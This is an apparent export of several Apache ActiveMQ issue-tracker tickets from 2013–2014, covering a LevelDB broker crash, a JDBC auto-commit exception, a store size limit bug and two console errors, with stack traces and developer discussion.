I was pushing messages using the example in: examples/openwire/swissarmy
and running: ant producer -Durl='failover:(tcp://demo01:61616,tcp://demo02:61616,tcp://demo03:61616)' -Ddurable=true -Dtopic=false -Dmax=10

I was just browsing the queue using the new hawtio web console.  Not really drilling into each of the messages.

Guillaume, could you add more details on how you you've been reproducing.  How you adding the messages?  Perhaps the number and size of the messages makes a difference.
;;;","30/Oct/13 17:44;Gnome;Hi Hiram,
I was using the activemq web console to send messages (destination: default foo.bar, default content and Persistent option ticked), to view the queue summary and to display the list of messages.
I have performed a couple of tests using the swissarmy example. I cannot reproduce the issue with 10 messages. However I managed to reproduce the problem when sending 1 message at the time (other parameter similar to yours). I am using the default activemq UI to view the queue summary and looking the queue content - which triggers the error at step 7.
;;;","30/Oct/13 18:25;chirino;Ok. thx. I was able to reproduce.. looking into the root cause now.;;;","31/Oct/13 16:58;chirino;unit test for this issue can be found at: 

https://github.com/apache/activemq/blob/trunk/activemq-leveldb-store/src/test/java/org/apache/activemq/leveldb/test/ReplicatedLevelDBBrokerTest.java

It was intermittently failing for me.;;;","31/Oct/13 17:23;chirino;Hi Guillaume,

I think I've fixed this issue now.  If you get a chance could you verify against the following build:
https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131031.171656-11-bin.tar.gz;;;","31/Oct/13 17:41;chirino;Ah.. hold off.. I'm still seeing the issue.  Need better unit test.;;;","01/Nov/13 18:06;chirino;Hi Guillaume,

Ok. I think I got it this time.  Could you check this build for me?

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131101.162431-14-bin.tar.gz;;;","04/Nov/13 17:17;Gnome;Hi Hiram, unfortunately I reproduced the issue with this build - using the army swiss example and sending 1 message at the time.;;;","06/Nov/13 13:48;chirino;Weird.  I can't reproduce anymore with the latest build.  Perhaps the build I linked to in the issue did not have the fix.  Here's a link to a fresh build:

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131106.134045-17-bin.tar.gz

Could you double check again?;;;","18/Nov/13 13:26;meurwinn;I, we have exectly the same error but in a non clustered environment.

We're using AMQ 5.9 with level db basic configuration.

We can reproduce it whis about 280 messages per second in a durable topic with one consumer.
The dispatched queue is around 0 to 150 messages.

The error occurs after 1h 50 min processing.

Erros :
2013-11-18 11:52:07,279 | INFO  | Stopping BrokerService[localhost] due to exception, java.io.IOException | org.apache.activemq.util.DefaultIOExceptionHandler | LevelDB IOException handler.
java.io.IOException
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:543)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:974)
	at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1270)
	at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1194)
	at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)
	at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recover(LevelDBStore.scala:733)
	at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:588)
	at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65)
	at org.apache.activemq.broker.region.Topic$6.run(Topic.java:721)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Unknown Source)
	at java.util.TimerThread.run(Unknown Source)
Caused by: java.lang.NullPointerException
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1198)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1194)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1272)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$RichDB.check$4(LevelDBClient.scala:315)
	at org.apache.activemq.leveldb.LevelDBClient$RichDB.cursorRange(LevelDBClient.scala:317)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply$mcV$sp(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient.usingIndex(LevelDBClient.scala:968)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$might_fail_using_index$1.apply(LevelDBClient.scala:974)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:540)
	... 11 more
2013-11-18 11:52:07,308 | INFO  | Apache ActiveMQ 5.9.0 (localhost, ID:SERVER-50960-1384765393652-0:1) is shutting down | org.apache.activemq.broker.BrokerService | IOExceptionHandler: stopping BrokerService[localhost]
2013-11-18 11:52:07,370 | WARN  | Failed to browse Topic: CHANGE_TOPIC | org.apache.activemq.broker.region.Topic | ActiveMQ Broker[localhost] Scheduler
org.apache.activemq.broker.SuppressReplyException: ShutdownBrokerInitiated
	at org.apache.activemq.util.DefaultIOExceptionHandler.handle(DefaultIOExceptionHandler.java:134)
	at org.apache.activemq.broker.BrokerService.handleIOException(BrokerService.java:2526)
	at org.apache.activemq.leveldb.LevelDBClient$$anon$2.run(LevelDBClient.scala:521)
Caused by: java.io.IOException
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:543)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:974)
	at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1270)
	at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1194)
	at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)
	at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recover(LevelDBStore.scala:733)
	at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:588)
	at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65)
	at org.apache.activemq.broker.region.Topic$6.run(Topic.java:721)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Unknown Source)
	at java.util.TimerThread.run(Unknown Source)
Caused by: java.lang.NullPointerException
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1198)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1194)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1272)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$RichDB.check$4(LevelDBClient.scala:315)
	at org.apache.activemq.leveldb.LevelDBClient$RichDB.cursorRange(LevelDBClient.scala:317)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply$mcV$sp(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
	at org.apache.activemq.leveldb.LevelDBClient.usingIndex(LevelDBClient.scala:968)
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$might_fail_using_index$1.apply(LevelDBClient.scala:974)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:540)
	... 11 more
2013-11-18 11:52:07,470 | INFO  | Stopped LevelDB[C:\TEST\apache-activemq-5.9.0\bin\..\data\LevelDB] | org.apache.activemq.leveldb.LevelDBStore | LevelDB IOException handler.
2013-11-18 11:52:13,821 | INFO  | The connection to 'tcp://127.0.0.1:59574' is taking a long time to shutdown. | org.apache.activemq.broker.TransportConnection | IOExceptionHandler: stopping BrokerService[localhost]
2013-11-18 11:52:18,823 | INFO  | The connection to 'tcp://127.0.0.1:59574' is taking a long time to shutdown. | org.apache.activemq.broker.TransportConnection | IOExceptionHandler: stopping BrokerService[localhost]
2013-11-18 11:52:23,854 | INFO  | The connection to 'tcp://127.0.0.1:59574' is taking a long time to shutdown. | org.apache.activemq.broker.TransportConnection | IOExceptionHandler: stopping BrokerService[localhost]
;;;","18/Nov/13 13:44;chirino;Tenzin,

Does it also happen with a fresh SNAPSHOT build?

http://repository.apache.org/service/local/artifact/maven/redirect?r=snapshots&g=org.apache.activemq&a=apache-activemq&v=5.10-SNAPSHOT&e=tar.gz&c=bin;;;","18/Nov/13 14:06;meurwinn;I've reproduce one more time the error so i'm trying with the snapshot but i'm on Windows server so the snapshot that i'm testing is this one :
https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131115.231503-20-bin.zip

Thanks.;;;","19/Nov/13 09:06;meurwinn;Hi,
the broker stopped 3 times this night after about 6h50min, then 6h50 min then 50min.
The error sounds to be the saùme (except the line number in class) but the broker restart automaticly with the snapshot. 

2013-11-19 05:27:43,671 | INFO  | Stopping BrokerService[localhost] due to exception, java.io.IOException | org.apache.activemq.util.DefaultIOExceptionHandler | LevelDB IOException handler.
java.io.IOException
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:554)
	at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:1021)
	at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1320)
	at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1244)
	at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)
	at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recover(LevelDBStore.scala:747)
	at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:588)
	at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65)
	at org.apache.activemq.broker.region.Topic$6.run(Topic.java:721)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Unknown Source)
	at java.util.TimerThread.run(Unknown Source)
Caused by: java.lang.NullPointerException
	at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1248)

It's not easy to reproduce. It's better with the snapshot but i can't say that no messages are lost with leveldb.;;;","19/Nov/13 13:59;chirino;Ok.. so right now it just seems like the master is rebooting due to an error that a new slave seems to recover from right?;;;","19/Nov/13 15:09;meurwinn;I'm not in a clustered environment, so there is on one node (that's the difference with Guillaume).;;;","20/Nov/13 13:40;meurwinn;I've try this night with AMQ 5.9 levelDb (no cluster) in case of 30 messages / s and there is no error or reboot (about 17h processing).

So the error appends only with a minimum of messages per second (200 or more).;;;","22/Nov/13 09:19;Gnome;Hiram, Sorry for the delay in testing the fix. I will try to come back to you at the beginning of next week.;;;","25/Nov/13 15:12;meurwinn;Hi,
some news ! my AMQ is processing 50 messages / s (1 producer/1 consumer, 1 persistent topic) since 3 days and it has failed 9 times, then reboot each time. 
The messages are not lost, but each time it failed, the producer is waiting and it's not the best for us.
The best should be to solve the problem.

The environment is NT and no cluster.
Maybe we could change the item title to ""LevelDB corrupted in AMQ (Cluster or Not)"" and the environment.;;;","25/Nov/13 16:04;chirino;Hi Tenzin,

Yeah if your setup is non-replicated, I'd open a new issue to track the problem since this issue was originally opened on a problem that only affected replicated setups.

Also it does not seem like the store gets 'corrupted' since you don't loose messages after a restart.;;;","25/Nov/13 16:17;meurwinn;Ok, sounds great, just give us the new issue number when it'll be done.
I'm agree to test new snapshot if you need.
Thanks.;;;","26/Nov/13 09:11;meurwinn;Hi, bad news...
After 12 errors and automatic reboot, AMQ seems to be very very slow and accept only one messages/second from the producer.
Performances are OK after a manual restart.

So, i stopped the AMQ and i had a lot of warning about ""Timer already cancelled"".
;;;","28/Nov/13 15:20;remogloor;https://issues.apache.org/jira/browse/AMQ-4882

is the unclustered version of this problem. I can reproduce this by 100% just by starting some client that processes and enqueues messages while starting/stopping AMQ. After some restarts AMQ won't start anymore and the log contains the exception posted by others in this issue.;;;","03/Dec/13 15:48;chirino;Hi Remo,

Thanks.  Tenzin, does AMQ-4882 seem like your issue?;;;","03/Dec/13 16:16;meurwinn;Hi Hiram,
the stack is the same, but the environment and the test procedure are not the same.

I can reproduce it in a NON clustered/replicated environment.
The test procedure is easy : i send about 200 messages / second in a persiatant durable TOPIC. Messages are consume by only one consumer on real time.
A few time per day, AMQ FAILED with the same error as i ever posted (the same as Remo) and REBOOT automaticly (AMQ 5.9.0 FAILED and only try to stop).

My second problem is that after maybe 10 automatic reboot (after failure), AMQ is very slow and accept only a few messages per second from the producer.;;;","03/Dec/13 17:07;chirino;Tenzin, how big are the messages and are you using transactions?;;;","03/Dec/13 17:12;meurwinn;Not shure, but i can remember that the average was probably about 4 000 bytes in my use case.;;;","04/Dec/13 16:05;chirino;Tenzin, since your issue seems different I opened a new issue under AMQ-4917.  It seems specifically related to durable subs.;;;","17/Dec/13 10:27;Gnome;Hiram, I can confirm that the problem raised in this ticket is resolved in the most recent build I could pick - apache-activemq-5.10-20131214.063224-32-bin.zip . 
Thanks for this. Guillaume
;;;","16/Jan/14 15:43;rajdavies;is this resolved?;;;","16/Jan/14 17:45;chirino;Marking issue as resolved since the fix was confirmed by Guillaume. Thx!;;;",,,,,,,,,,,,,,,,,,,,,,
Calling Connection.commit() on a Connection with setAutoCommit(true) throws SQLException,AMQ-4836,12676582,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jiri.patera,jiri.patera,30/Oct/13 09:24,19/Aug/14 16:41,14/Jul/23 05:43,19/Aug/14 16:41,5.7.0,,,,,5.11.0,,,Message Store,,,,0,,,,,,,,,"This issue is similar to AMQ-577 (resolved by adding a MSSQL JDBC URL parameter) and AMQ-711 (resolved as cannot reproduce) issues.

The problem is that the JDBC API (the {{Connection}} class JavaDoc) states:

{code}
    /**
     * Makes all changes made since the previous
     * commit/rollback permanent and releases any database locks
     * currently held by this <code>Connection</code> object. 
     * This method should be
     * used only when auto-commit mode has been disabled.
     *
     * @exception SQLException if a database access error occurs, 
     * this method is called while participating in a distributed transaction,
     * if this method is called on a closed conection or this
     *            <code>Connection</code> object is in auto-commit mode
     * @see #setAutoCommit 
     */
    void commit() throws SQLException;
{code}

However, some JDBC drivers do not throw the {{SQLException}} when the {{Connection.commit()}} method is called on a {{Connection}} instance with {{setAutoCommit(true)}}. Some others do (Firebird, SAP-HANA, MSSQL without the JDBC URL parameter {{relaxAutoCommit=true}}). With these databases the following exceptions can be thrown on the Broker start-up:

1) {{DefaultJDBCAdapter.doDropTables(DefaultJDBCAdapter.java:148)}}:

{code}
Caused by: com.sap.db.jdbc.exceptions.JDBCDriverException: SAP DBTech JDBC: Connection is currently in auto commit mode.
	at com.sap.db.jdbc.exceptions.SQLExceptionSapDB.createException(SQLExceptionSapDB.java:334)
	at com.sap.db.jdbc.exceptions.SQLExceptionSapDB.generateSQLException(SQLExceptionSapDB.java:113)
	at com.sap.db.jdbc.ConnectionSapDB.commit(ConnectionSapDB.java:351)
	at com.sap.db.jdbc.trace.Connection.commit(Connection.java:126)
	at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:334)
	at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.commit(PoolingDataSource.java:211)
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doDropTables(DefaultJDBCAdapter.java:148)
	at org.apache.activemq.store.jdbc.adapter.OptimizedDefaultJDBCAdapter.doDropTables(OptimizedDefaultJDBCAdapter.java:68)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150)
	at org.springframework.aop.interceptor.AbstractTraceInterceptor.invoke(AbstractTraceInterceptor.java:113)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
	at com.sun.proxy.$Proxy12.doDropTables(Unknown Source)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.deleteAllMessages(JDBCPersistenceAdapter.java:526)
	... 64 more
{code}

2) {{DefaultJDBCAdapter.doCreateTables(DefaultJDBCAdapter.java:119)}}

{code}
Caused by: com.sap.db.jdbc.exceptions.JDBCDriverException: SAP DBTech JDBC: Connection is currently in auto commit mode.
	at com.sap.db.jdbc.exceptions.SQLExceptionSapDB.createException(SQLExceptionSapDB.java:334)
	at com.sap.db.jdbc.exceptions.SQLExceptionSapDB.generateSQLException(SQLExceptionSapDB.java:113)
	at com.sap.db.jdbc.ConnectionSapDB.commit(ConnectionSapDB.java:351)
	at com.sap.db.jdbc.trace.Connection.commit(Connection.java:126)
	at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:334)
	at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.commit(PoolingDataSource.java:211)
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doCreateTables(DefaultJDBCAdapter.java:119)
	at org.apache.activemq.store.jdbc.adapter.OptimizedDefaultJDBCAdapter.doCreateTables(OptimizedDefaultJDBCAdapter.java:62)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150)
	at org.springframework.aop.interceptor.AbstractTraceInterceptor.invoke(AbstractTraceInterceptor.java:113)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
	at com.sun.proxy.$Proxy12.doCreateTables(Unknown Source)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.deleteAllMessages(JDBCPersistenceAdapter.java:528)
	... 64 more
{code}

This led us to a workaround where we simply override the 1) and 2) methods and replaced the following code in them:

{code}
      c.getConnection().commit();
{code}

With the following code (to prevent the exceptions from being thrown):

{code}
      if (!c.getConnection().getAutoCommit()) { /* HACK */
        c.getConnection().commit();
      }
{code}

I believe that the ActiveMQ code should correspond to the JDBC API specification by calling the {{Connection.commit()}} method only on connections with {{setAutoCommit(false)}}. This approach is already implemented in the ActiveMQ code, for example, in the following method:

{code}
org.apache.activemq.store.jdbc.TransactionContext.commit()
{code}","JDK 1.6.0_45, Firebird or HDB (SAP HANA DB) configured as a persistent storage",donnchadh,jiri.patera,rkraus,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5318,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,356014,,,Tue Aug 19 16:41:27 UTC 2014,,,,,,,,,,,"0|i1pdin:",356302,,,,,,,,,,,,,,,,,,,,,"04/Nov/13 08:15;rkraus;Is the real problem with MSSQL too? I know that {{relaxAutoCommit=true}} JDBC URL parameter is known ""workaround"" on MySQL and it is described in [jdbc-support|http://activemq.apache.org/jdbc-support.html]. Isn't only a typo mistake (MSSQL instead of MySQL)?;;;","04/Nov/13 09:29;jiri.patera;Yes, it is MySQL. I made a typo when mentioning the AMQ-577 (resolved by adding a MSSQL JDBC URL parameter) issue. So I am confirming that this has nothing to do with the MSSQL database.;;;","19/Aug/14 16:41;tabish;This is resolved with the fixes in AMQ-5318;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Broker limits store space, not taking into account what it's already using",AMQ-4832,12676478,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,mattofak,mattofak,29/Oct/13 20:07,14/Sep/15 18:35,14/Jul/23 05:43,31/Oct/13 21:18,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"https://issues.apache.org/jira/browse/AMQ-4638 sets the usage limit of a store to only the available disk space. It does not take into account that the store itself is using space on the disk.

In our environment the store was taking 30 GB of space and there was 17 GB free on disk. Therefore, on startup the store was limited to 17 GB; where it should have been limited to 47 GB. Because of this, by design, no new message can be added to the queue.",,boday,donnchadh,gtully,mattofak,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5328,,,,,,,,,,AMQ-5967,,,,,,,,,,,,,,,,"31/Oct/13 01:30;mattofak;0001-Store-limit-check-current-usage-and-disk-free-space.patch;https://issues.apache.org/jira/secure/attachment/12611226/0001-Store-limit-check-current-usage-and-disk-free-space.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,355910,,,Fri Feb 28 20:43:04 UTC 2014,,,,,,,,,,,"0|i1pcvj:",356198,,,,,,,,,,,,,,,,,,,,,"31/Oct/13 01:30;mattofak;Patch sets the limit of the store to the sum of the usage and the free space.;;;","31/Oct/13 21:18;gtully;patch applied with thanks in http://git-wip-us.apache.org/repos/asf/activemq/commit/85541935;;;","28/Feb/14 20:43;boday;this should be backported to a 5.9.X release since 5.10.0 hasn't been released...its a major bug;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq:dstat command can throw error for topic subscriptions views,AMQ-4829,12676138,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,28/Oct/13 15:54,28/Jul/14 21:02,14/Jul/23 05:43,28/Oct/13 16:01,5.9.0,,,,,5.10.0,,,,,,,0,,,,,,,,,"You can get errors like

{code}
activemq:dstat
Name                                                Queue Size  Producer #  Consumer #   Enqueue #   Dequeue #    Memory %
foo                                                        105           0           0         105           0          11
ActiveMQ.Advisory.Queue                                      0           0           0           1           0           0
ActiveMQ.Advisory.MasterBroker                               0           0           0           1           0           0
ActiveMQ.Advisory.Connection                                 0           0           0           1           0           0
ERROR: java.lang.RuntimeException: Failed to execute dstat task. Reason: java.lang.reflect.UndeclaredThrowableException
java.lang.RuntimeException: Failed to execute dstat task. Reason: java.lang.reflect.UndeclaredThrowableException
	at org.apache.activemq.console.command.DstatCommand.runTask(DstatCommand.java:78)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:387)
	at org.apache.activemq.karaf.commands.ActiveMQCommandSupport.doExecute(ActiveMQCommandSupport.java:46)
	at org.apache.karaf.shell.console.OsgiCommandSupport.execute(OsgiCommandSupport.java:39)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:35)
	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:89)
	at org.apache.karaf.shell.console.jline.Console.run(Console.java:174)
	at org.apache.karaf.shell.console.jline.DelayedStarted.run(DelayedStarted.java:61)
Error executing command: java.lang.reflect.UndeclaredThrowableException
{code}

Also the dstat should sort the listing first, so they are listed A..Z",,davsclaus,sobkowiak,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,355635,,,Mon Jul 28 21:02:45 UTC 2014,,,,,,,,,,,"0|i1pb6f:",355923,,,,,,,,,,,,,,,,,,,,,"28/Jul/14 21:02;sobkowiak;Could you backport this fix in {{5.9.x}} if you plan to release {{5.9.2}}?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Bug in web console,AMQ-4828,12676113,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,jbonofre,brat,brat,28/Oct/13 13:08,07/Mar/14 15:02,14/Jul/23 05:43,07/Mar/14 15:02,5.9.0,,,,,5.10.0,,,Web Console,,,,0,web-console,,,,,,,,"I think I discovered a bug in activemq-web-console under karaf (not sure
if it exists in the standalone amq).

When you try to open http://localhost:8181/activemqweb/connections.jsp it will
show ""Error!"" and ""Exception occurred while processing this request, check the log for more information!"".

Stack trace attached. Seems like networkTTL property cannot be found for some reason?","Karaf 2.3.3, Java 1.6.0.45 x64, Windows 7 Pro x64 ",artnaseef,brat,davsclaus,dlaube,jbonofre,mwsmith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4998,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Oct/13 13:09;brat;error.txt;https://issues.apache.org/jira/secure/attachment/12610551/error.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,355610,,,Fri Mar 07 15:02:03 UTC 2014,,,,,,,,,,,"0|i1pb0v:",355898,,,,,,,,,,,,,,,,,,,,,"28/Oct/13 13:09;brat;Stack trace;;;","30/Oct/13 08:04;davsclaus;The old web console is deprecated. You can try the new hawtio console instead.

features:choose hawtio 1.2-M25
features:install hawtio

And then access localhost:8181/hawtio for this console.

;;;","14/Nov/13 20:41;mwsmith;I've run into the same issue. Is there a view in hawtio console that is equivalent to the old connections tab?;;;","22/Nov/13 09:53;davsclaus;Yes in the AMQ tree under clientConnectors;;;","05/Feb/14 20:52;jbonofre;I reproduced the issue on 5.9.0 outside Karaf (ActiveMQ as standalone).

As we agreed to remove hawt.io from the default console set, I gonna fix this issue in the ""old new"" web console ;);;;","05/Feb/14 21:01;jbonofre;Actually, I think that the networkConnector proxy in the web console is not up to date. Even putting the NetworkTTL in the <networkConnector/> configuration, it doesn't work.

I gonna fix that.;;;","07/Mar/14 15:02;artnaseef;This appears to be the same issue as AMQ-4998, which has been addressed.  Please reopen if that is not accurate.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
